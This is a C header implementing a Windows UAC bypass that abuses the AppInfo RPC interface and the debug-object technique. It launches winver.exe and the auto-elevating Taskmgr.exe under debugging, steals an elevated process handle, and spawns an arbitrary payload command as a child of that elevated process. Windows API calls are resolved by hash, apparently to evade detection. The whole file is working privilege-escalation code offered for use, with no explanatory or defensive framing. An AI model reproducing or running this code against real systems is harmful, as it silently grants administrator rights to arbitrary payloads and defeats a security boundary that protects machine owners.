#ifndef APPINFOALPC_H
#define APPINFOALPC_H

#include "winapi_loader.h"
#include <rpc.h>
#include <rpcndr.h>

STRINGW(appinfo_rpc, "201ef99a-7fa0-444c-9399-19ba84f12a1a")
STRINGW(default_desktop, "WinSta0\\Default")
STRINGW(winver_exe, "\\System32\\winver.exe")
STRINGW(autoele_exe, "\\System32\\Taskmgr.exe")
STRINGW(ncalrpc, "ncalrpc")

STRINGW(rpcrt4_dll, "rpcrt4.dll")
#define ndroleallocate HASH("NdrOleAllocate")
#define ndrolefree HASH("NdrOleFree")
#define ndrasyncclientcall HASH("NdrAsyncClientCall")

#define rpcstringbindingcomposew HASH("RpcStringBindingComposeW")
#define rpcbindingfromstringbindingw HASH("RpcBindingFromStringBindingW")
#define rpcstringfreew HASH("RpcStringFreeW")
#define rpcbindingsetauthinfoexw HASH("RpcBindingSetAuthInfoExW")
#define rpcasyncinitializehandle HASH("RpcAsyncInitializeHandle")
#define rpcasynccompletecall HASH("RpcAsyncCompleteCall")
#define rpcbindingfree HASH("RpcBindingFree")

#define ntdebugcontinue HASH("NtDebugContinue")
#define ntwaitfordebugevent HASH("NtWaitForDebugEvent")
#define ntcreateevent HASH("NtCreateEvent")
#define ntwaitforsingleobject HASH("NtWaitForSingleObject")
#define ntqueryinformationprocess HASH("NtQueryInformationProcess")
#define ntremoveprocessdebug HASH("NtRemoveProcessDebug")
#define ntduplicateobject HASH("NtDuplicateObject")
#define ntterminateprocess HASH("NtTerminateProcess")
#define ntclose HASH("NtClose")

#define kernel32_dll HASH("kernel32.dll")
#define createprocessw HASH("CreateProcessW")

typedef enum _EVENT_TYPE {
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;

typedef void* (RPC_ENTRY* NdrOleAllocate_t)(size_t);
typedef void (RPC_ENTRY* NdrOleFree_t)(void*);
typedef void (RPC_ENTRY* NdrAsyncClientCall_t)(PMIDL_STUB_DESC, PFORMAT_STRING, ...);

typedef RPC_STATUS(RPC_ENTRY* RpcStringBindingComposeW_t)(RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR*);
typedef RPC_STATUS(RPC_ENTRY* RpcBindingFromStringBindingW_t)(RPC_WSTR, RPC_BINDING_HANDLE*);
typedef RPC_STATUS(RPC_ENTRY* RpcStringFreeW_t)(RPC_WSTR*);
typedef RPC_STATUS(RPC_ENTRY* RpcBindingSetAuthInfoExW_t)(RPC_BINDING_HANDLE, RPC_WSTR, ULONG, ULONG, RPC_AUTH_IDENTITY_HANDLE, ULONG, RPC_SECURITY_QOS*);
typedef RPC_STATUS(RPC_ENTRY* RpcAsyncInitializeHandle_t)(PRPC_ASYNC_STATE, unsigned int);
typedef RPC_STATUS(RPC_ENTRY* RpcAsyncCompleteCall_t)(PRPC_ASYNC_STATE, void*);
typedef RPC_STATUS(RPC_ENTRY* RpcBindingFree_t)(RPC_BINDING_HANDLE*);

typedef NTSTATUS (NTAPI *NtDebugContinue_t)(HANDLE, PCLIENT_ID, NTSTATUS);
typedef NTSTATUS (NTAPI* NtWaitForDebugEvent_t)(HANDLE, BOOLEAN, PLARGE_INTEGER, PVOID);
typedef NTSTATUS (NTAPI* NtQueryInformationProcess_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI* NtRemoveProcessDebug_t)(HANDLE, HANDLE);
typedef NTSTATUS (NTAPI* NtDuplicateObject_t)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI* NtClose_t)(HANDLE);
typedef NTSTATUS (NTAPI* NtCreateEvent_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, EVENT_TYPE, BOOLEAN);
typedef NTSTATUS (NTAPI* NtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *NtTerminateProcess_t)(HANDLE, NTSTATUS);

typedef BOOL (WINAPI* CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

typedef DEBUG_EVENT *PDEBUG_EVENT; 

typedef struct _DBGKM_EXCEPTION
{
    EXCEPTION_RECORD ExceptionRecord;
    ULONG FirstChance;
} DBGKM_EXCEPTION, *PDBGKM_EXCEPTION;

typedef struct _DBGKM_CREATE_THREAD
{
    ULONG SubSystemKey;
    PVOID StartAddress;
} DBGKM_CREATE_THREAD, *PDBGKM_CREATE_THREAD;

typedef struct _DBGKM_CREATE_PROCESS
{
    ULONG SubSystemKey;
    HANDLE FileHandle;
    PVOID BaseOfImage;
    ULONG DebugInfoFileOffset;
    ULONG DebugInfoSize;
    DBGKM_CREATE_THREAD InitialThread;
} DBGKM_CREATE_PROCESS, *PDBGKM_CREATE_PROCESS;

typedef struct _DBGKM_EXIT_THREAD
{
    NTSTATUS ExitStatus;
} DBGKM_EXIT_THREAD, *PDBGKM_EXIT_THREAD;

typedef struct _DBGKM_EXIT_PROCESS
{
    NTSTATUS ExitStatus;
} DBGKM_EXIT_PROCESS, *PDBGKM_EXIT_PROCESS;

typedef struct _DBGKM_LOAD_DLL
{
    HANDLE FileHandle;
    PVOID BaseOfDll;
    ULONG DebugInfoFileOffset;
    ULONG DebugInfoSize;
    PVOID NamePointer;
} DBGKM_LOAD_DLL, *PDBGKM_LOAD_DLL;

typedef struct _DBGKM_UNLOAD_DLL
{
    PVOID BaseAddress;
} DBGKM_UNLOAD_DLL, *PDBGKM_UNLOAD_DLL;

typedef enum _DBG_STATE
{
    DbgIdle,
    DbgReplyPending,
    DbgCreateThreadStateChange,
    DbgCreateProcessStateChange,
    DbgExitThreadStateChange,
    DbgExitProcessStateChange,
    DbgExceptionStateChange,
    DbgBreakpointStateChange,
    DbgSingleStepStateChange,
    DbgLoadDllStateChange,
    DbgUnloadDllStateChange
} DBG_STATE, *PDBG_STATE;

typedef struct _DBGUI_CREATE_THREAD
{
    HANDLE HandleToThread;
    DBGKM_CREATE_THREAD NewThread;
} DBGUI_CREATE_THREAD, *PDBGUI_CREATE_THREAD;

typedef struct _DBGUI_CREATE_PROCESS
{
    HANDLE HandleToProcess;
    HANDLE HandleToThread;
    DBGKM_CREATE_PROCESS NewProcess;
} DBGUI_CREATE_PROCESS, *PDBGUI_CREATE_PROCESS;

typedef struct _DBGUI_WAIT_STATE_CHANGE
{
    DBG_STATE NewState;
    CLIENT_ID AppClientId;
    union
    {
        DBGKM_EXCEPTION Exception;
        DBGUI_CREATE_THREAD CreateThread;
        DBGUI_CREATE_PROCESS CreateProcessInfo;
        DBGKM_EXIT_THREAD ExitThread;
        DBGKM_EXIT_PROCESS ExitProcess;
        DBGKM_LOAD_DLL LoadDll;
        DBGKM_UNLOAD_DLL UnloadDll;
    } StateInfo;
} DBGUI_WAIT_STATE_CHANGE, *PDBGUI_WAIT_STATE_CHANGE;

typedef struct _PROC_THREAD_ATTR {
    DWORD_PTR attr;
    SIZE_T size;
    void *value;
} PROC_THREAD_ATTR, *PPROC_THREAD_ATTR;

typedef struct _PROC_THREAD_ATTRIBUTE_LIST_INTERNAL {
    DWORD mask;       
    DWORD size;       
    DWORD count;      
    DWORD pad;        
    DWORD_PTR unk;    
    PROC_THREAD_ATTR attrs[1]; 
} PROC_THREAD_ATTRIBUTE_LIST_INTERNAL, *PPROC_THREAD_ATTRIBUTE_LIST_INTERNAL;

typedef struct _MONITOR_POINT {
    long MonitorLeft;
    long MonitorRight;
} MONITOR_POINT;

typedef struct _APP_STARTUP_INFO {
    wchar_t *lpszTitle;
    long dwX, dwY, dwXSize, dwYSize;
    long dwXCountChars, dwYCountChars;
    long dwFillAttribute;
    long dwFlags;
    short wShowWindow;
    short cbReserved2;
    MONITOR_POINT MonitorPoint;
} APP_STARTUP_INFO;

typedef struct _APP_PROCESS_INFORMATION {
    unsigned __int3264 ProcessHandle;
    unsigned __int3264 ThreadHandle;
    long ProcessId;
    long ThreadId;
} APP_PROCESS_INFORMATION;

typedef struct _NT_API {
    HMODULE hNtdll;
    HMODULE hRpcrt4;

    NtClose_t NtClose;
} NT_API;

__attribute__((section(".text"), aligned(1)))
unsigned char TypeFormat[] = {
    0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x08, 0x25, 0x5c, 0x11, 0x00, 0x0a, 0x00, 0x15, 0x03,
    0x08, 0x00, 0x08, 0x08, 0x5c, 0x5b, 0x1a, 0x03, 0x38, 0x00, 0x00, 0x00, 0x14, 0x00, 0x36, 0x08,
    0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x06, 0x3e, 0x4c, 0x00, 0xe3, 0xff, 0x40, 0x5c, 0x5b,
    0x12, 0x08, 0x05, 0x5c, 0x11, 0x04, 0x02, 0x00, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xb9, 0xb9, 0x08, 0x08, 0x5c, 0x5b, 0x11, 0x0c, 0x08, 0x5c, 0x00
};

__attribute__((section(".text"), aligned(1)))
unsigned char ProcFormat[] = {
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x32, 0x00, 0x08, 0x00, 0x20, 0x00,
    0x24, 0x00, 0xc7, 0x0c, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,
    0x10, 0x00, 0x02, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x02, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00,
    0x48, 0x00, 0x28, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x30, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x38, 0x00,
    0x08, 0x00, 0x0b, 0x01, 0x40, 0x00, 0x16, 0x00, 0x48, 0x00, 0x48, 0x00, 0xb9, 0x00, 0x48, 0x00,
    0x50, 0x00, 0x08, 0x00, 0x13, 0x61, 0x58, 0x00, 0x38, 0x00, 0x50, 0x21, 0x60, 0x00, 0x08, 0x00,
    0x70, 0x00, 0x68, 0x00, 0x08, 0x00, 0x00
};

__attribute__((section(".text"), aligned(1)))
RPC_CLIENT_INTERFACE RpcClientInterface = {
    sizeof(RPC_CLIENT_INTERFACE),
    {{0x201ef99a,0x7fa0,0x444c,{0x93,0x99,0x19,0xba,0x84,0xf1,0x2a,0x1a}},{1,0}},
    {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
    0,0,0,0,0,0x00000000
};

void RAiLaunchAdminProcess(
    NT_API *api, PRPC_ASYNC_STATE a, handle_t b, wchar_t *p,
	wchar_t *c, long sf, long cf, wchar_t *d, wchar_t *ws,
    struct _APP_STARTUP_INFO *si, unsigned __int3264 hw,
    long t, struct _APP_PROCESS_INFORMATION *pi, long *e)
{
    NdrOleAllocate_t NdrOleAllocate = (NdrOleAllocate_t)myGetProcAddressH(api->hRpcrt4, ndroleallocate);
    NdrOleFree_t NdrOleFree = (NdrOleFree_t)myGetProcAddressH(api->hRpcrt4, ndrolefree);
    NdrAsyncClientCall_t NdrAsyncClientCall = (NdrAsyncClientCall_t)myGetProcAddressH(api->hRpcrt4, ndrasyncclientcall);

    MIDL_STUB_DESC StubDesc;
    
    StubDesc.RpcInterfaceInformation = &RpcClientInterface;
    StubDesc.pFormatTypes = TypeFormat;
    StubDesc.pfnAllocate = NdrOleAllocate;
    StubDesc.pfnFree = NdrOleFree;
    StubDesc.pMallocFreeStruct = NULL;

    NdrAsyncClientCall(&StubDesc, (PFORMAT_STRING)ProcFormat, a, b, p, c, sf, cf, d, ws, si, hw, t, pi, e);
}

void AicLaunchAdminProcess(
    NT_API *api, LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags,
    LPWSTR Dir, LPWSTR WSta, HWND hWnd, DWORD Tout, WORD Show,
    APP_PROCESS_INFORMATION *PInfo)
{
    NtCreateEvent_t NtCreateEvent = (NtCreateEvent_t)myGetProcAddressH(api->hNtdll, ntcreateevent);
    NtWaitForSingleObject_t NtWaitForSingleObject = (NtWaitForSingleObject_t)myGetProcAddressH(api->hNtdll, ntwaitforsingleobject);
    LdrLoadDll_t LdrLoadDll = (LdrLoadDll_t)myGetProcAddressH(api->hNtdll, ldrloadll);

    UNICODE_STRING ustr;
    InitUnicodeString(&ustr, rpcrt4_dll);
    
    api->hRpcrt4 = NULL;
    LdrLoadDll(NULL, 0, &ustr, (PHANDLE)&api->hRpcrt4);

    RpcStringBindingComposeW_t RpcStringBindingComposeW = (RpcStringBindingComposeW_t)myGetProcAddressH(api->hRpcrt4, rpcstringbindingcomposew);
    RpcBindingFromStringBindingW_t RpcBindingFromStringBindingW = (RpcBindingFromStringBindingW_t)myGetProcAddressH(api->hRpcrt4, rpcbindingfromstringbindingw);
    RpcStringFreeW_t RpcStringFreeW = (RpcStringFreeW_t)myGetProcAddressH(api->hRpcrt4, rpcstringfreew);
    RpcBindingSetAuthInfoExW_t RpcBindingSetAuthInfoExW = (RpcBindingSetAuthInfoExW_t)myGetProcAddressH(api->hRpcrt4, rpcbindingsetauthinfoexw);
    RpcAsyncInitializeHandle_t RpcAsyncInitializeHandle = (RpcAsyncInitializeHandle_t)myGetProcAddressH(api->hRpcrt4, rpcasyncinitializehandle);
    RpcAsyncCompleteCall_t RpcAsyncCompleteCall = (RpcAsyncCompleteCall_t)myGetProcAddressH(api->hRpcrt4, rpcasynccompletecall);
    RpcBindingFree_t RpcBindingFree = (RpcBindingFree_t)myGetProcAddressH(api->hRpcrt4, rpcbindingfree);

    RPC_BINDING_HANDLE h = NULL;
    RPC_ASYNC_STATE as;
    RPC_SECURITY_QOS_V3 q;
    RPC_WSTR sb = NULL;
    PSID sid = NULL;
    APP_STARTUP_INFO si = {0};
    LONG et = 0;
    VOID* r = NULL;

    RpcStringBindingComposeW((RPC_WSTR)appinfo_rpc, ncalrpc, NULL, NULL, NULL, &sb);

    RpcBindingFromStringBindingW(sb, &h);
    RpcStringFreeW(&sb);

    BYTE sidBuffer[12];
    sid = (PSID)sidBuffer;
      
    BYTE *p = (BYTE*)sid;
      
    p[0]=0x01; p[1]=0x01;
    p[2]=0x00; p[3]=0x00;
    p[4]=0x00; p[5]=0x00;
    p[6]=0x00; p[7]=0x05;
    p[8]=0x12; p[9]=0x00;
    p[10]=0x00; p[11]=0x00;

    q.Version = 3;
    q.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    q.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
    q.Sid = sid;

    RpcBindingSetAuthInfoExW(h, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, NULL, 0, (RPC_SECURITY_QOS*)&q);

    RpcAsyncInitializeHandle(&as, sizeof(as));

    as.NotificationType = RpcNotificationTypeEvent;

    HANDLE hEvent = NULL;

    NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE);

    as.u.hEvent = hEvent;

    RAiLaunchAdminProcess(api, &as, h, Path, Cmd, SFlags, CFlags, Dir, WSta, &si, (unsigned __int3264)hWnd, Tout, PInfo, &et);

    NtWaitForSingleObject(hEvent, FALSE, NULL);

    RpcAsyncCompleteCall(&as, &r);

    api->NtClose(hEvent);

    RpcBindingFree(&h);
}

int InvokeAppInfoElevation(LPWSTR payloadCmd, int nShowCmd) {
    NT_API api;

    HMODULE hKernel32 = myGetModuleHandleH(kernel32_dll);
	api.hNtdll = myGetModuleHandleH(ntdll_dll);

    CreateProcessW_t CreateProcessW = (CreateProcessW_t)myGetProcAddressH(hKernel32, createprocessw);

    NtDebugContinue_t NtDebugContinue = (NtDebugContinue_t)myGetProcAddressH(api.hNtdll, ntdebugcontinue);
    NtWaitForDebugEvent_t NtWaitForDebugEvent = (NtWaitForDebugEvent_t)myGetProcAddressH(api.hNtdll, ntwaitfordebugevent);
    NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)myGetProcAddressH(api.hNtdll, ntqueryinformationprocess);
    NtRemoveProcessDebug_t NtRemoveProcessDebug = (NtRemoveProcessDebug_t)myGetProcAddressH(api.hNtdll, ntremoveprocessdebug);
    NtDuplicateObject_t NtDuplicateObject = (NtDuplicateObject_t)myGetProcAddressH(api.hNtdll, ntduplicateobject);
    NtTerminateProcess_t NtTerminateProcess = (NtTerminateProcess_t)myGetProcAddressH(api.hNtdll, ntterminateprocess);
    api.NtClose = (NtClose_t)myGetProcAddressH(api.hNtdll, ntclose);

    int result = 0;

    HANDLE dbgHandle = NULL;
    HANDLE dbgProcessHandle = NULL;
    HANDLE dupHandle = NULL;

    APP_PROCESS_INFORMATION procInfo;
    DEBUG_EVENT dbgEvent;

    WCHAR *payloadData = payloadCmd;
    
    SIZE_T payloadLen = 0;
    while (payloadData[payloadLen])
        payloadLen++;
    
    WCHAR lpszPayload[payloadLen + 1];
    
    for (SIZE_T i = 0; i < payloadLen; i++)
        lpszPayload[i] = payloadData[i];
    
    lpszPayload[payloadLen] = L'\0';

    WCHAR* windir_val = (WCHAR*)(0x7FFE0000 + 0x30); // NtSystemRoot

    /* -----------------------------
       Build windowsDirectory (X:\Windows)
       ----------------------------- */
    SIZE_T lenDir = 0;
    while (windir_val[lenDir]) lenDir++;
    
    WCHAR windowsDirectory[lenDir + 1];
    
    SIZE_T i = 0;
    for (; i < lenDir; i++)
        windowsDirectory[i] = windir_val[i];
    
    windowsDirectory[lenDir] = L'\0';

    /* -----------------------------
       FIRST PROCESS PATH (winver.exe)
       ----------------------------- */
    SIZE_T lenDir1 = 0;
    while (windowsDirectory[lenDir1]) lenDir1++;
    
    SIZE_T lenExe1 = 0;
    while (winver_exe[lenExe1]) lenExe1++;
    
    SIZE_T total1 = lenDir1 + lenExe1;
    
    WCHAR szProcess[total1 + 1];
    
    for (SIZE_T k = 0; k < lenDir1; k++)
        szProcess[k] = windowsDirectory[k];
    
    for (SIZE_T k = 0; k < lenExe1; k++)
        szProcess[lenDir1 + k] = winver_exe[k];
    
    szProcess[total1] = L'\0';

    AicLaunchAdminProcess(&api, szProcess, szProcess, 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, windowsDirectory, default_desktop, NULL, INFINITE, SW_HIDE, &procInfo);

    NtQueryInformationProcess((HANDLE)procInfo.ProcessHandle, ProcessDebugObjectHandle, &dbgHandle, sizeof(HANDLE), NULL);

    NtRemoveProcessDebug((HANDLE)procInfo.ProcessHandle, dbgHandle);
    NtTerminateProcess((HANDLE)procInfo.ProcessHandle, 0);

    api.NtClose((HANDLE)procInfo.ThreadHandle);
    api.NtClose((HANDLE)procInfo.ProcessHandle);

    /* -----------------------------
           SECOND PROCESS PATH
       ----------------------------- */
    SIZE_T lenDir2 = 0;
    while (windowsDirectory[lenDir2]) lenDir2++;
    
    SIZE_T lenExe2 = 0;
    while (autoele_exe[lenExe2]) lenExe2++;
    
    SIZE_T total2 = lenDir2 + lenExe2;
    
    WCHAR szProcess2[total2 + 1];
    
    for (SIZE_T k = 0; k < lenDir2; k++)
        szProcess2[k] = windowsDirectory[k];
    
    for (SIZE_T k = 0; k < lenExe2; k++)
        szProcess2[lenDir2 + k] = autoele_exe[k];
    
    szProcess2[total2] = L'\0';

    AicLaunchAdminProcess(&api, szProcess2, szProcess2, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, windowsDirectory, default_desktop, NULL, INFINITE, SW_HIDE, &procInfo);

    if (!procInfo.ProcessHandle)
	{
        api.NtClose(dbgHandle);
        return result;
	}

    /* -----------------------------
               Debug Start
       ----------------------------- */
    PTEB teb = (PTEB)__readgsqword(0x30);
    *(PHANDLE)((PBYTE)teb + 0x16A8) = dbgHandle; // DbgSsReserved
    
	DBGUI_WAIT_STATE_CHANGE nativeStateChange;
	
    while (1) {
        NtWaitForDebugEvent(dbgHandle, FALSE, NULL, (PVOID)&nativeStateChange);

        LPDEBUG_EVENT dbgEventPtr = &dbgEvent;
        dbgEventPtr->dwProcessId = PtrToUlong(nativeStateChange.AppClientId.UniqueProcess);
        dbgEventPtr->dwThreadId = PtrToUlong(nativeStateChange.AppClientId.UniqueThread);
        
        switch (nativeStateChange.NewState)
        {
            case DbgCreateProcessStateChange:
                dbgEventPtr->dwDebugEventCode = CREATE_PROCESS_DEBUG_EVENT;
                dbgEventPtr->u.CreateProcessInfo.hProcess = nativeStateChange.StateInfo.CreateProcessInfo.HandleToProcess;
                break;
        
            case DbgLoadDllStateChange:
                dbgEventPtr->dwDebugEventCode = LOAD_DLL_DEBUG_EVENT;
                break;
        }
    
        if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT)
            dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
    
        if (dbgEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT && dbgProcessHandle) {
            NtDuplicateObject(dbgProcessHandle, (HANDLE)-1, (HANDLE)-1, &dupHandle, PROCESS_ALL_ACCESS, 0, 0);
        
            STARTUPINFOEXW si = {0};
            PROCESS_INFORMATION pi;
            si.StartupInfo.cb = sizeof(si);
            
            char attrBuffer[sizeof(PROC_THREAD_ATTRIBUTE_LIST_INTERNAL)];
            PPROC_THREAD_ATTRIBUTE_LIST_INTERNAL list = (PPROC_THREAD_ATTRIBUTE_LIST_INTERNAL)attrBuffer;
            
            list->mask  = 1;
            list->size  = 1;
            list->count = 1;
            
            PPROC_THREAD_ATTR entry = list->attrs;
            entry->attr  = 0x00020000; // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
            entry->size  = sizeof(HANDLE);
            entry->value = &dupHandle;
            
            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)list;
            
            si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
            si.StartupInfo.wShowWindow = (WORD)nShowCmd;
            si.StartupInfo.lpDesktop = default_desktop;
            
            if (CreateProcessW(NULL, lpszPayload, NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, windowsDirectory, (LPSTARTUPINFOW)&si, &pi))
            {
                result = 1;
                api.NtClose(pi.hThread);
                api.NtClose(pi.hProcess);
            }
    
            api.NtClose(dupHandle);

            CLIENT_ID clientId;
            clientId.UniqueProcess = (HANDLE)(ULONG_PTR)dbgEvent.dwProcessId;
            clientId.UniqueThread  = (HANDLE)(ULONG_PTR)dbgEvent.dwThreadId;
    
            NtDebugContinue(dbgHandle, &clientId, DBG_CONTINUE);
            break;
        }

        CLIENT_ID clientId;
        clientId.UniqueProcess = (HANDLE)(ULONG_PTR)dbgEvent.dwProcessId;
        clientId.UniqueThread  = (HANDLE)(ULONG_PTR)dbgEvent.dwThreadId;
    
        NtDebugContinue(dbgHandle, &clientId, DBG_CONTINUE);
    }

    /* -----------------------------
                 Cleanup
       ----------------------------- */
    *(PHANDLE)((PBYTE)teb + 0x16A8) = NULL;
	
    api.NtClose(dbgProcessHandle);
    api.NtClose(dbgHandle);

	NtTerminateProcess((HANDLE)procInfo.ProcessHandle, 0);

    api.NtClose((HANDLE)procInfo.ThreadHandle);
    api.NtClose((HANDLE)procInfo.ProcessHandle);

    return result;
}

#endif // APPINFOALPC_H
